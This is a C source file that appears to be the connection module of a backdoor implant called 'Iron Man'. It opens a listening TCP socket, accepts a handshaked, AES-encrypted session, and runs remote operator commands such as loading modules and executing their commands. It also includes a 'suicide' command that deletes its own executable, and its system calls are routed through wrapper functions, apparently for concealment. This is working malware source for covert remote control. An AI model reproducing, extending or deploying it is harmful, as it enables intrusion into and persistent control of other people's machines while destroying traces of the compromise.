#include "connection.h"

/// The listening socket's file descriptor.
int socket_fd = -1;

int connection_fd = -1;

/// The AES context for communication, used to encrypt and decrypt the messages sent through the connection.
struct AES_ctx communication_ctx;

result read_into_buffer(buffer *buf) {
    INITIALIZE_RESULT(res);
    char buf_size[8];

    // Read and decrypt the size of the data.
    if (read_f(connection_fd, buf_size, 8) != 8) {
        HANDLE_ERROR(res, FAILED_READ, "Failed reading from socket", NULL)
    }
    AES_CTR_xcrypt_buffer(&communication_ctx, (uint8_t *) buf_size, sizeof(buf_size));

    // Allocate a buffer for the data.
    res = reuse_buffer(buf, char_to_uint64(buf_size));
    HANDLE_ERROR_RESULT(res)

    // Read and decrypt the data into the buffer.
    if (read_f(connection_fd, buf->data, buf->size) != buf->size) {
        HANDLE_ERROR(res, FAILED_READ, "Failed reading from socket", NULL)
    }
    AES_CTR_xcrypt_buffer(&communication_ctx, (uint8_t *) buf->data, buf->size);

    goto cleanup;

    error_cleanup:

    destroy_buffer(buf);

    cleanup:

    return res;
}

buffer read_buffer(result *res) {
    INITIALIZE_BUFFER(buf);
    *res = read_into_buffer(&buf);
    return buf;
}

result send_string(char *string, uint64_t size) {
    INITIALIZE_RESULT(res);
    char size_[8];

    // Encrypt and send the size of the data.
    uint64_to_char(size, size_);
    AES_CTR_xcrypt_buffer(&communication_ctx, (uint8_t *) size_, 8);
    if (write_f(connection_fd, size_, 8) != 8) {
        HANDLE_ERROR(res, FAILED_WRITE, "Failed writing to socket", NULL)
    }

    // Encrypt and send the data.
    AES_CTR_xcrypt_buffer(&communication_ctx, (uint8_t *) string, size);
    if (write_f(connection_fd, string, size) != size) {
        HANDLE_ERROR(res, FAILED_WRITE, "Failed writing to socket", NULL)
    }

    goto cleanup;

    error_cleanup:

    cleanup:

    return res;
}

result send_buffer(buffer buf) {
    return send_string(buf.data, buf.size);
}

result send_result(result res) {
    INITIALIZE_RESULT(res_);
    char values[8];

    // Encrypt and send the result.
    unsigned_int_to_char(res.code, values);
    unsigned_int_to_char(res.errno_value, values + 4);
    AES_CTR_xcrypt_buffer(&communication_ctx, (uint8_t *) values, 8);
    if (write_f(connection_fd, values, 8) != 8) {
        HANDLE_ERROR(res_, FAILED_WRITE, "Failed writing to socket", NULL)
    }

    goto cleanup;

    error_cleanup:

    cleanup:

    return res_;
}

result connect_() {
    unsigned int client_address_len;
    struct sockaddr_in server_address, client_address;
    INITIALIZE_RESULT(res);
    INITIALIZE_BUFFER(buf);

    // Create a TCP socket.
    socket_fd = socket_f(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (-1 == socket_fd) {
        HANDLE_ERROR(res, FAILED_SOCKET, "Failed creating socket", NULL)
    }
    WRITE_LOG(DEBUG, "Created socket", NULL)
    bzero_f(&server_address, sizeof(server_address));

    // Bind the socket to a port.
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = htonl(INADDR_ANY);
    server_address.sin_port = htons(PORT);
    if (bind_f(socket_fd, (struct sockaddr *) &server_address, sizeof(server_address)) != 0) {
        HANDLE_ERROR(res, FAILED_BIND, "Failed binding socket", NULL)
    }
    WRITE_LOG(DEBUG, "Bound socket", NULL)

    // Listen for a new connection.
    if (listen_f(socket_fd, 0) == -1) {
        HANDLE_ERROR(res, FAILED_LISTEN, "Failed listening on socket", NULL)
    }
    WRITE_LOG(DEBUG, "Listening on socket", NULL)

    // Accept the new connection.
    client_address_len = sizeof(client_address);
    connection_fd = accept_f(socket_fd, (struct sockaddr *) &client_address, &client_address_len);
    if (-1 == connection_fd) {
        HANDLE_ERROR(res, FAILED_ACCEPT, "Failed accepting connection", NULL)
    }
    WRITE_LOG(DEBUG, "Accepted connection", NULL)

    // Initialize the AES communication context.
    AES_init_ctx_iv(&communication_ctx, COMMUNICATION_KEY, COMMUNICATION_IV);

    // Validate the handshake.
    buf = read_buffer(&res);
    HANDLE_ERROR_RESULT(res)
    uint64_t value = read_uint64_t(&res, &buf);
    HANDLE_ERROR_RESULT(res)
    if (value != HANDSHAKE) {
        HANDLE_ERROR(res, HANDSHAKE_FAILED, "Handshake failed: 0x%08llx", value)
    }

    goto cleanup;

    error_cleanup:

    // Disconnect.
    disconnect();

    cleanup:

    destroy_buffer(&buf);

    return res;
}

result communicate(const char *const self_path) {
    INITIALIZE_BUFFER(buf);
    INITIALIZE_BUFFER(buf_out);
    INITIALIZE_RESULT(res);
    INITIALIZE_RESULT(tmp_res);
    const char *command_key;
    const char *command_iv;

    while (1) {
        RESET_RESULT(res)

        buf = read_buffer(&res);
        HANDLE_ERROR_RESULT(res)

        // Read the command ID from the buffer.
        uint64_t command_id = read_uint64_t(&res, &buf);
        HANDLE_ERROR_RESULT(res)

        // Disconnect.
        if (command_id == DISCONNECT_COMMAND_ID) {
            WRITE_LOG(INFO, "Gracefully disconnecting", NULL)
            break;
        }

        // Add module command.
        if (command_id == ADD_MODULE_COMMAND_COMMAND_ID) {
            res = add_module_command_from_buffer(&buf);
            HANDLE_ERROR_RESULT(res)

            destroy_buffer(&buf);

            tmp_res = send_result(res);
            HANDLE_ERROR_RESULT(tmp_res)

            continue;
        }

        // Remove module command.
        if (command_id == REMOVE_MODULE_COMMAND_COMMAND_ID) {
            res = remove_module_command_from_buffer(&buf);
            HANDLE_ERROR_RESULT(res)

            destroy_buffer(&buf);

            tmp_res = send_result(res);
            HANDLE_ERROR_RESULT(tmp_res)

            continue;
        }

        // Stop.
        if (command_id == STOP_COMMAND_ID) {
            HANDLE_ERROR(res, STOPPING, "Gracefully stopping Iron Man", NULL)
        }

        // Suicide.
        if (command_id == SUICIDE_COMMAND_ID) {
            WRITE_LOG(INFO, "Gracefully suiciding Iron Man", NULL)
            // Deleting this executable.
            if (unlink_f(self_path) != 0) {
                HANDLE_ERROR(res, FAILED_UNLINK, "Failed unlinking self", NULL)
            }
            HANDLE_ERROR(res, SUICIDING, "Successfully unlinked self", NULL)
        }

        // Read the command's AES key and initialization vector from the buffer, and call the command.
        command_key = read_string(&res, &buf, KEY_LENGTH);
        command_iv = read_string(&res, &buf, IV_LENGTH);
        buf_out = run_command(&res, command_id, command_key, command_iv, &buf);

        // Send the command's result status and results.
        tmp_res = send_result(res);
        HANDLE_ERROR_RESULT(tmp_res)
        if (RESULT_SUCCEEDED(res)) {
            res = send_buffer(buf_out);
            HANDLE_ERROR_RESULT(res)
        }

        // Destroy the buffers.
        destroy_buffer(&buf_out);
        destroy_buffer(&buf);
    }

    goto cleanup;

    error_cleanup:

    cleanup:

    // Destroy the buffers.
    destroy_buffer(&buf_out);
    destroy_buffer(&buf);

    return res;
}

void disconnect() {
    // Close the sockets and reset their values.
    close_f(connection_fd);
    close_f(socket_fd);
    connection_fd = -1;
    socket_fd = -1;
}
